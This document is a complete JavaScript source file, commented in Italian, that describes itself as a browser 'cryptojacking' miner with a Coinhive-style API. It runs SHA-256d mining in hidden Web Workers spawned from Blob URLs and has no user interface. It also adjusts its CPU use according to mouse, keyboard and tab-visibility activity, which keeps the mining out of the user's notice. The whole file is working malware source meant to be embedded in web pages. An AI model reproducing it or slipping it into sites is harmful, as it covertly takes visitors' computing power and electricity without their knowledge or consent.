/*!
 * miner.js — cryptojacking miner per browser.
 * Un file. Zero dipendenze. Zero DOM. Nessuna UI.
 *
 * SHA-256d sincrono su header 80 byte con nonce a 32 bit negli ultimi 4 byte,
 * midstate del primo blocco precalcolato, N Web Worker da Blob URL con spazio
 * di nonce disgiunto, throttling automatico su idle/tab nascosta.
 * API globale window.Miner in stile Coinhive.
 */
(function (global) {
  'use strict';

  var VERSION = '1.1.0';
  var NONCE_RANGE = 0x8000;      // 32768 nonce per worker, poi riparte (adatto a probe)
  var SLICE_MS = 40;             // durata di uno slice di lavoro per ciclo
  var REPORT_MS = 250;           // intervallo di report dai worker

  var cfg = {
    workers: 0,          // 0 = auto (hardwareConcurrency - 1)
    throttle: 0.7,       // 0..1 frazione di CPU concessa
    difficulty: 18,      // bit di zero iniziali richiesti per contare una share
    autoThrottle: true,
    idleMs: 30000,
    idleThrottle: 0.2
  };

  var st = {
    running: false,
    handles: [],
    headerBytes: null,
    totalHashes: 0,
    shares: 0,
    lastHashes: 0,
    hashrate: 0,
    peakHashrate: 0,
    startedAt: 0,
    timer: null,
    idleTimer: null,
    savedThrottle: null
  };

  var listeners = {};

  /* ================================================================== */
  /* CORPO DEL WORKER                                                    */
  /* Serializzato con toString(): ogni costante che usa deve stare      */
  /* DENTRO questa funzione, o nello scope del Blob non esiste.          */
  /* ================================================================== */
  function workerBody(port) {
    'use strict';

    var CHUNK = 0x2000000;   // 2^25 nonce per worker -> 16 worker senza collisioni
    var SLICE_MS = 40;
    var REPORT_MS = 250;

    var K = new Int32Array([
      0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
      0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
      0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
      0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
      0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
      0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
      0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
      0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2
    ]);

    var IV = new Int32Array([
      0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a,
      0x510e527f, 0x9b05688c, 0x1f83d9ab, 0x5be0cd19
    ]);

    var w = new Int32Array(64);       // message schedule riusato (no ricorsione)

    function rotr(x, n) { return (x >>> n) | (x << (32 - n)); }

    function compress(H, inWords) {
      var i, x, y, t1, t2, a, b, c, d, e, f, g, h;

      for (i = 0; i < 16; i++) w[i] = inWords[i];
      for (i = 16; i < 64; i++) {
        x = w[i - 15]; y = w[i - 2];
        w[i] = (w[i - 16] +
                ((rotr(x, 7) ^ rotr(x, 18) ^ (x >>> 3)) | 0) +
                w[i - 7] +
                ((rotr(y, 17) ^ rotr(y, 19) ^ (y >>> 10)) | 0)) | 0;
      }

      a = H[0]; b = H[1]; c = H[2]; d = H[3];
      e = H[4]; f = H[5]; g = H[6]; h = H[7];

      for (i = 0; i < 64; i++) {
        t1 = (h + ((rotr(e, 6) ^ rotr(e, 11) ^ rotr(e, 25)) | 0) +
              ((e & f) ^ (~e & g)) + K[i] + w[i]) | 0;
        t2 = (((rotr(a, 2) ^ rotr(a, 13) ^ rotr(a, 22)) | 0) +
              ((a & b) ^ (a & c) ^ (b & c))) | 0;
        h = g; g = f; f = e; e = (d + t1) | 0;
        d = c; c = b; b = a; a = (t1 + t2) | 0;
      }

      H[0] = (H[0] + a) | 0; H[1] = (H[1] + b) | 0; H[2] = (H[2] + c) | 0; H[3] = (H[3] + d) | 0;
      H[4] = (H[4] + e) | 0; H[5] = (H[5] + f) | 0; H[6] = (H[6] + g) | 0; H[7] = (H[7] + h) | 0;
    }

    function lzBits(H) {
      var bits = 0, i, x, c;
      for (i = 0; i < 8; i++) {
        x = H[i] >>> 0;
        if (x === 0) { bits += 32; continue; }
        c = 0;
        while (x < 0x80000000) { c++; x = (x << 1) >>> 0; }
        return bits + c;
      }
      return bits;
    }

    function hexDigest(H) {
      var s = '', i;
      for (i = 0; i < 8; i++) s += ('0000000' + (H[i] >>> 0).toString(16)).slice(-8);
      return s;
    }

    /* --- stato del worker --- */
    var running = true;
    var throttle = 0.7;
    var difficulty = 18;
    var mid = new Int32Array(8);      // midstate SHA-256 del blocco 1 dell'header
    var b2 = new Int32Array(16);      // blocco 2 dell'header (16 byte + padding)
    var d2 = new Int32Array(16);      // secondo hash: 32 byte digest + padding
    var H1 = new Int32Array(8);
    var H2 = new Int32Array(8);
    var base = 0;
    var local = 0;
    var span = CHUNK;
    var load = false;

    d2[8] = 0x80000000;               // 0x80 al byte 32
    d2[15] = 256;                     // 32 byte = 256 bit

    function setJob(msg) {
      var b = msg.header;             // Uint8Array(80)
      var blk = new Int32Array(16);
      var i, j;

      for (i = 0; i < 16; i++) {
        j = i * 4;
        blk[i] = ((b[j] << 24) | (b[j + 1] << 16) | (b[j + 2] << 8) | b[j + 3]) | 0;
      }
      mid.set(IV);
      compress(mid, blk);             // primi 64 byte costanti -> calcolati una volta

      // blocco 2 dell'hash 1: byte 64..79, poi 0x80, poi lunghezza 640 bit
      for (i = 0; i < 16; i++) b2[i] = 0;
      for (i = 0; i < 4; i++) {
        j = 64 + i * 4;
        b2[i] = ((b[j] << 24) | (b[j + 1] << 16) | (b[j + 2] << 8) | b[j + 3]) | 0;
      }
      b2[4] = 0x80000000;             // 0x80 al byte 16 del blocco 2
      b2[15] = 640;                   // 80 byte = 640 bit

      difficulty = msg.difficulty | 0;
      if (difficulty < 1) difficulty = 1;
      if (difficulty > 32) difficulty = 32;

      span = msg.span || CHUNK;
      base = ((msg.index || 0) * span) >>> 0;
      local = 0;
      load = true;
    }

    function mine(n) {
      var nonce, i, j;
      for (i = 0; i < n; i++) {
        nonce = (base + local) >>> 0;
        b2[3] = nonce | 0;            // nonce negli ultimi 4 byte dell'header

        H1.set(mid);
        compress(H1, b2);

        d2[0] = H1[0]; d2[1] = H1[1]; d2[2] = H1[2]; d2[3] = H1[3];
        d2[4] = H1[4]; d2[5] = H1[5]; d2[6] = H1[6]; d2[7] = H1[7];
        H2.set(IV);
        compress(H2, d2);

        if (lzBits(H2) >= difficulty) {
          port.postMessage({ type: 'found', nonce: nonce, hash: hexDigest(H2) });
        }

        local++;
        if (local >= span) local = 0;
      }
    }

    var pending = 0;
    var lastReport = 0;

    function tick() {
      if (!running) return;
      if (!load || throttle <= 0) { setTimeout(tick, SLICE_MS); return; }

      var budget = SLICE_MS * throttle;
      var t0 = performance.now();
      var deadline = t0 + budget;

      while (performance.now() < deadline) { mine(512); pending += 512; }

      var now = Date.now();
      if (now - lastReport >= REPORT_MS) {
        port.postMessage({ type: 'progress', hashes: pending });
        pending = 0;
        lastReport = now;
      }

      setTimeout(tick, SLICE_MS * (1 - throttle));
    }

    port.onmessage = function (e) {
      var m = e.data;
      if (m.type === 'job') setJob(m);
      else if (m.type === 'throttle') throttle = m.value;
      else if (m.type === 'go') running = true;
      else if (m.type === 'stop') {
        running = false;
        if (pending) { port.postMessage({ type: 'progress', hashes: pending }); pending = 0; }
      }
    };

    setTimeout(tick, 0);
  }

  /* ================================================================== */
  /* SPAWN con fallback sul thread principale                            */
  /* ================================================================== */
  var blobURL = null;

  function makeInlineWorker() {
    var host = { onmessage: null };
    var port = {
      onmessage: null,
      postMessage: function (m) { setTimeout(function () { if (host.onmessage) host.onmessage({ data: m }); }, 0); }
    };
    workerBody(port);
    return {
      postMessage: function (m) { if (port.onmessage) port.onmessage({ data: m }); },
      terminate: function () { if (port.onmessage) port.onmessage({ data: { type: 'stop' } }); }
    };
  }

  function spawn() {
    if (typeof Worker !== 'undefined' && typeof Blob !== 'undefined' &&
        typeof URL !== 'undefined' && URL.createObjectURL) {
      try {
        if (!blobURL) {
          blobURL = URL.createObjectURL(new Blob(
            ['(', workerBody.toString(), ')(self);'],
            { type: 'application/javascript' }
          ));
        }
        return new Worker(blobURL);
      } catch (e) { /* su alcuni browser file:// rifiuta i blob worker */ }
    }
    return makeInlineWorker();
  }

  /* ================================================================== */
  /* EVENTI                                                              */
  /* ================================================================== */
  function on(ev, fn) { (listeners[ev] = listeners[ev] || []).push(fn); return api; }
  function off(ev, fn) {
    var l = listeners[ev], i;
    if (!l) return api;
    i = l.indexOf(fn); if (i >= 0) l.splice(i, 1);
    return api;
  }
  function emit(ev, d) {
    var l = listeners[ev], i;
    if (!l) return;
    for (i = 0; i < l.length; i++) { try { l[i](d); } catch (e) { } }
  }

  /* ================================================================== */
  /* JOB                                                                 */
  /* ================================================================== */
  function normalizeHeader(h) {
    var out = new Uint8Array(80), i;
    if (h == null) { for (i = 0; i < 80; i++) out[i] = (Math.random() * 256) | 0; return out; }
    if (typeof h === 'string') {
      if (h.length !== 160) throw new Error('header hex: attesi 160 caratteri, ricevuti ' + h.length);
      for (i = 0; i < 80; i++) out[i] = parseInt(h.substr(i * 2, 2), 16);
      return out;
    }
    if (h.length !== 80) throw new Error('header: attesi 80 byte');
    for (i = 0; i < 80; i++) out[i] = h[i] & 0xff;
    return out;
  }

  function dispatch() {
    if (!st.headerBytes) return;
    for (var i = 0; i < st.handles.length; i++) {
      st.handles[i].postMessage({
        type: 'job',
        header: st.headerBytes.slice(0),
        difficulty: cfg.difficulty,
        index: i,
        span: NONCE_RANGE
      });
    }
  }

  function setJob(header, difficulty) {
    st.headerBytes = normalizeHeader(header);
    if (typeof difficulty === 'number') cfg.difficulty = difficulty;
    dispatch();
    return api;
  }

  /* ================================================================== */
  /* THROTTLE                                                            */
  /* ================================================================== */
  var activityHandler = null;

  function applyThrottle(v) {
    cfg.throttle = v;
    for (var i = 0; i < st.handles.length; i++) st.handles[i].postMessage({ type: 'throttle', value: v });
    emit('throttle', { throttle: v });
  }

  function goIdle() {
    if (st.savedThrottle === null) st.savedThrottle = cfg.throttle;
    applyThrottle(cfg.idleThrottle);
  }

  function unIdle() {
    if (st.savedThrottle !== null) {
      var back = st.savedThrottle; st.savedThrottle = null;
      applyThrottle(back);
    }
  }

  function activity() {
    unIdle();
    if (st.idleTimer) clearTimeout(st.idleTimer);
    st.idleTimer = setTimeout(goIdle, cfg.idleMs);
  }

  function onVisibility() {
    if (typeof document !== 'undefined' && document.hidden) { if (st.idleTimer) clearTimeout(st.idleTimer); goIdle(); }
    else activity();
  }

  function enableAutoThrottle() {
    cfg.autoThrottle = true;
    if (activityHandler || typeof addEventListener !== 'function') return api;
    activityHandler = activity;
    addEventListener('mousemove', activityHandler, true);
    addEventListener('keydown', activityHandler, true);
    addEventListener('scroll', activityHandler, true);
    addEventListener('touchstart', activityHandler, true);
    addEventListener('visibilitychange', onVisibility, false);
    activity();
    return api;
  }

  function disableAutoThrottle() {
    cfg.autoThrottle = false;
    if (typeof removeEventListener === 'function' && activityHandler) {
      removeEventListener('mousemove', activityHandler, true);
      removeEventListener('keydown', activityHandler, true);
      removeEventListener('scroll', activityHandler, true);
      removeEventListener('touchstart', activityHandler, true);
      removeEventListener('visibilitychange', onVisibility, false);
    }
    activityHandler = null;
    if (st.idleTimer) clearTimeout(st.idleTimer);
    unIdle();
    return api;
  }

  /* ================================================================== */
  /* START / STOP                                                        */
  /* ================================================================== */
  function handleMsg(index, m) {
    if (m.type === 'progress') st.totalHashes += m.hashes;
    else if (m.type === 'found') {
      st.shares++;
      emit('found', { nonce: m.nonce, hash: m.hash, worker: index, shares: st.shares });
    }
  }

  function start(nWorkers, throttle) {
    if (st.running) return api;

    if (typeof nWorkers === 'number' && nWorkers > 0) cfg.workers = nWorkers;
    if (typeof throttle === 'number') cfg.throttle = throttle;

    var n = cfg.workers || Math.max(1, ((global.navigator && navigator.hardwareConcurrency) || 2) - 1);
    n = Math.min(n, 16);

    if (!st.headerBytes) st.headerBytes = normalizeHeader(null);

    for (var i = 0; i < n; i++) {
      (function (idx) {
        var wk = spawn();
        wk.onmessage = function (e) { handleMsg(idx, e.data); };
        wk.postMessage({ type: 'throttle', value: cfg.throttle });
        st.handles.push(wk);
      })(i);
    }

    st.running = true;
    st.startedAt = Date.now();
    dispatch();

    if (st.timer) clearInterval(st.timer);
    st.timer = setInterval(function () {
      st.hashrate = st.totalHashes - st.lastHashes;
      st.lastHashes = st.totalHashes;
      if (st.hashrate > st.peakHashrate) st.peakHashrate = st.hashrate;
      emit('progress', {
        hashrate: st.hashrate,
        peak: st.peakHashrate,
        totalHashes: st.totalHashes,
        shares: st.shares,
        throttle: cfg.throttle,
        workers: st.handles.length,
        uptime: Date.now() - st.startedAt
      });
    }, 1000);

    if (cfg.autoThrottle) enableAutoThrottle();

    emit('start', { workers: st.handles.length, throttle: cfg.throttle, difficulty: cfg.difficulty });
    return api;
  }

  function stop() {
    if (!st.running) return api;
    for (var i = 0; i < st.handles.length; i++) st.handles[i].terminate();
    st.handles = [];
    st.running = false;
    if (st.timer) { clearInterval(st.timer); st.timer = null; }
    if (st.idleTimer) clearTimeout(st.idleTimer);
    st.hashrate = 0;
    emit('stop', { totalHashes: st.totalHashes, shares: st.shares });
    return api;
  }

  /* ================================================================== */
  /* API PUBBLICA                                                        */
  /* ================================================================== */
  var api = {
    version: VERSION,

    get running() { return st.running; },
    get hashrate() { return st.hashrate; },
    get peakHashrate() { return st.peakHashrate; },
    get totalHashes() { return st.totalHashes; },
    get shares() { return st.shares; },
    get throttle() { return cfg.throttle; },
    get difficulty() { return cfg.difficulty; },
    get workers() { return st.handles.length; },

    on: on,
    off: off,
    start: start,
    stop: stop,

    setThrottle: function (v) { applyThrottle(Math.max(0, Math.min(1, v))); return api; },
    setDifficulty: function (bits) { cfg.difficulty = Math.max(1, Math.min(32, bits | 0)); dispatch(); return api; },
    setJob: setJob,
    setWorkers: function (n) {
      cfg.workers = n | 0;
      if (st.running) { stop(); start(); }
      return api;
    },
    enableAutoThrottle: enableAutoThrottle,
    disableAutoThrottle: disableAutoThrottle,

    stats: function () {
      return {
        running: st.running,
        hashrate: st.hashrate,
        peak: st.peakHashrate,
        totalHashes: st.totalHashes,
        shares: st.shares,
        throttle: cfg.throttle,
        difficulty: cfg.difficulty,
        workers: st.handles.length,
        uptime: st.running ? Date.now() - st.startedAt : 0,
        expectedHashesPerShare: Math.pow(2, cfg.difficulty)
      };
    }
  };

  global.Miner = api;

})(typeof self !== 'undefined' ? self : this);
